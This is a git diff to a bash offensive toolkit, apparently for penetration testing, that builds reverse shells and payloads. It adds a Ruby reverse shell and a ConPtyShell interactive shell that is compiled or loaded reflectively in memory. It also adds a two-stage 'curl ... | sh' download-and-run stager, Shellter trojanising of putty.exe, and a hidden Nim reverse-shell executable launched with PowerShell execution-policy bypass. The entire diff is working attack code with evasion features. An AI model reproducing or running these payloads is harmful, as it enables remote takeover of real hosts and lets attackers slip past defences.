@@ -112,7 +112,17 @@ get_php_reverse_shell() {
 
 get_ruby_reverse_shell() {
     prepare_generic_linux_shell
-    local reverse_shell="require 'socket'; s=TCPSocket.open(\"$host_ip\",$host_port); [0,1,2].each{|fd| syscall(33,s.fileno,fd)}; exec(\"/bin/sh -i\")"
+    if [[ -z $target_arch ]]; then
+        target_arch="x64"
+    fi
+    # Determine dup2 value based on architecture
+    local dup2=""
+    if [[ $target_arch == "x86" ]]; then
+        dup2="63"
+    else
+        dup2="33"
+    fi
+    local reverse_shell="require 'socket'; s=TCPSocket.open(\"$host_ip\",$host_port); [0,1,2].each{|fd| syscall($dup2,s.fileno,fd)}; exec(\"/bin/sh -i\")"
     if [[ ! -z $reverse_type ]] && [[ $reverse_type == "java_exec" ]]; then
         reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
         reverse_shell="{\"ruby\", \"-e\" , \"$reverse_shell\"}"
@@ -147,6 +157,23 @@ encode_powershell() {
     fi
 }
 
+
+prepare_generic_windows_shell() {
+    if [ -z "$host_port" ]; then
+        host_port=4444  # Default reverse shell port
+    fi
+    if [ -z "$host_ip" ]; then
+        host_ip=$(get_host_ip)  # Function to get the host IP address
+    fi
+    if [ -z "$http_ip" ]; then
+        echo "HTTP IP address must be set before creating shell."
+        return 1
+    fi
+    if [ -z "$http_port" ]; then
+        echo "HTTP port must be set before creating shell."
+        return 1
+    fi
+}
 
 get_powershell_reverse_shell() {    
     if [ ! -z "$1" ]; then
@@ -235,27 +262,10 @@ get_powercat_reverse_shell() {
     echo $(encode_powershell "$reverse_shell")
 }
 
+
 get_powershell_interactive_shell() {
-    if [ ! -z "$1" ]; then
-        host_port=$1
-    fi
-    if [ -z "$host_port" ]; then
-        host_port=4444
-    fi
-    if [ ! -z "$2" ]; then
-        host_ip=$2
-    fi
-    if [ -z "$host_ip" ]; then
-        host_ip=$(get_host_ip)  # Function to get the host IP address
-    fi
-    if [ -z "$http_ip" ]; then
-        echo "HTTP IP address must be set before running interactive shell."
-        return 1
-    fi
-    if [ -z "$http_port" ]; then
-        echo "HTTP port must be set before running interactive shell."
-        return 1
-    fi
+
+    prepare_generic_windows_shell
     local shell_file_name="reverse_interactive_shell_${host_ip}_${host_port}.ps1"
     cp $SCRIPTDIR/../ps1/reverse_interactive_shell.ps1 $shell_file_name
     sed -i -E 's/\{host_port\}/"'$host_port'";/g' $shell_file_name
@@ -279,6 +289,62 @@ get_powershell_interactive_shell() {
         return 0
     fi
     echo $(encode_powershell "$reverse_shell")
+
+}
+
+get_powershell_interactive_shell_compiled() {
+    prepare_generic_windows_shell
+    cp $SCRIPTDIR/../cs/ConPtyShell.cs .
+    stty_size=$(stty size)
+    stty_rows=$(echo "$stty_size" | awk '{print $1}')
+    stty_cols=$(echo "$stty_size" | awk '{print $2}')
+    sed -E -i 's/\{host_ip\}/'"$host_ip"'/g' ConPtyShell.cs
+    sed -E -i 's/\{host_port\}/'"$host_port"'/g' ConPtyShell.cs
+    sed -E -i 's/\{stty_rows\}/'"$stty_rows"'/g' ConPtyShell.cs
+    sed -E -i 's/\{stty_cols\}/'"$stty_cols"'/g' ConPtyShell.cs
+    if [[ -z $dotnet_command ]]; then
+        dotnet_command="csc"
+        project_file="ConPtyShell.cs"
+    elif [[ "$dotnet_command" == "build" ]]; then
+        project_file="ConPtyShell"
+        mkdir -p $project_file
+        cp $SCRIPTDIR/../cs/ConPtyShell.csproj $project_file/
+        mv ConPtyShell.cs $project_file/
+    fi
+    build_dotnet
+    unzip -qq -o build.zip 
+    cp build/$output_file .
+    generate_windows_download "$output_file" "C:\\windows\\temp\\$output_file"
+    stty_size=$(stty size)
+    echo "C:\\windows\\temp\\$output_file $host_ip $host_port $stty_rows $stty_cols"
+}
+
+get_powershell_interactive_shell_reflected() {
+    dotnet_command="build"
+    get_powershell_interactive_shell_compiled #>> $trail_log
+    if [ -z $output_file ]; then
+        echo "Output file not found after compilation."
+        return 1
+    fi
+    cp $SCRIPTDIR/../ps1/PrepareReflect.ps1 . 
+    sed -i -E 's/\{TARGET_FILE\}/ConPtyShell\\build\\'$output_file'/g' PrepareReflect.ps1
+    sed -i -E 's/\{OUTPUT_FILE\}/ConPtyShell.txt/g' PrepareReflect.ps1
+    scp PrepareReflect.ps1 $windows_username@$windows_computername:~/PrepareReflect.ps1 >> $trail_log
+    ssh $windows_username@$windows_computername "powershell -ExecutionPolicy Bypass ./PrepareReflect.ps1" 
+    scp $windows_username@$windows_computername:~/ConPtyShell.txt . >> $trail_log
+    #echo "\$payload = \"$(cat ConPtyShell.txt | tr -d '\r\n')\"" > payload_base64.txt
+    payload_base64_txt="ConPtyShell.txt"
+    cp $SCRIPTDIR/../ps1/Reflect.ps1 .
+    sed -i -E 's/\{http_ip\}/'"$http_ip"'/g' Reflect.ps1
+    sed -i -E 's/\{http_port\}/'"$http_port"'/g' Reflect.ps1
+    sed -i -E "s/\{PAYLOAD_BASE64_TXT\}/$payload_base64_txt/g" Reflect.ps1
+    sed -i -E "s/\{PAYLOAD_BIN\}/$output_file/g" Reflect.ps1
+    sed -i -E "s/\{PAYLOAD_CLASS\}/ConPtyShellMainClass/g" Reflect.ps1
+    sed -i -E "s/\{PAYLOAD_METHOD\}/ConPtyShellMain/g" Reflect.ps1
+    generate_windows_download "Reflect.ps1" "C:\\windows\\temp\\Reflect.ps1"
+    echo "cd C:\\windows\\temp;"
+    echo ". .\Reflect.ps1;"
+    echo "Invoke-Reflect $host_ip $host_port $stty_rows $stty_cols"
 
 }
 
@@ -308,6 +374,16 @@ get_windows_binaries_powershell() {
         fi
         echo $(encode_powershell "$download")
       fi
+}
+
+get_twostage_reverse_shell() {
+    if [[ -z $cmd ]]; then
+        cmd=$(get_bash_reverse_shell)
+    fi
+    echo '#!/bin/bash' > reverse_shell.sh
+    echo "$cmd" >> reverse_shell.sh
+    chmod +x reverse_shell.sh
+    echo "curl http://$http_ip:$http_port/reverse_shell.sh | sh"
 }
 
 get_nc_reverse_shell_powershell() {
@@ -355,6 +431,55 @@ get_powershell_in_memory_shell() {
     cmd=$(encode_powershell "$cmd")
     echo "$cmd"
 }
+
+create_shellter_payload() {
+    local download_url="https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
+    if [[ -f "putty.exe" ]]; then
+        echo "putty.exe already exists."
+    else
+        wget $download_url -O putty.exe
+    fi
+    if [[ -f shellter.done ]]; then
+        echo "shellter.done already exists."
+        return 0
+    fi
+    if [[ -z $cmd ]]; then
+        cmd=$(get_powershell_interactive_shell)
+    fi
+    shellter #-p winexec --cmd \"$cmd\" --stealth
+    touch shellter.done
+
+}
+
+create_nim_reverse_shell() {
+    if [[ -z $host_port ]]; then
+        host_port=4444  # Default reverse shell port
+    fi
+    if [[ -z $host_ip ]]; then
+        host_ip=$(get_host_ip)
+    fi
+    local url="https://raw.githubusercontent.com/Sn1r/Nim-Reverse-Shell/refs/heads/main/rev_shell.nim"
+    #local url="https://gist.githubusercontent.com/mttaggart/d119b13b248cdc7c9df264e432e60892/raw/1bf8e5abe3aa6705ec68f3b09811a729e20bd204/nimrs.nim"
+    if [[ ! -f "rev_shell.nim" ]]; then
+        wget $url -O rev_shell.nim
+    fi
+    cp rev_shell.nim temp.nim
+    sed -E -i "s/v1 = .*/v1 = \"$host_ip\"/g" temp.nim
+    sed -E -i "s/v2 = .*/v2 = \"$host_port\"/g" temp.nim 
+    sed -E -i "s/execProcess\(.*/execProcess\(\"powershell -ep bypass -w hidden -nop -c \" \& c\)/g" temp.nim
+    #sed -E -i "s/ address = .*/ address = \"$host_ip\"/g" temp.nim
+    #sed -E -i "s/ port = .*/ port = $host_port/g" temp.nim
+    nim c -d:mingw --app:gui --verbosity:0 temp.nim
+    if [[ -f "temp.exe" ]]; then
+        random_name=$RANDOM
+        cmd=$(generate_windows_download "temp.exe" "C:\\Windows\\Temp\\temp_$random_name.exe")
+        cmd+="c:\\Windows\\Temp\\temp_$random_name.exe;"
+        cmd=$(encode_powershell "$cmd")
+        echo "$cmd"
+    fi
+}
+
+
 
 start_listener() {
     if [ -z "$host_port" ]; then
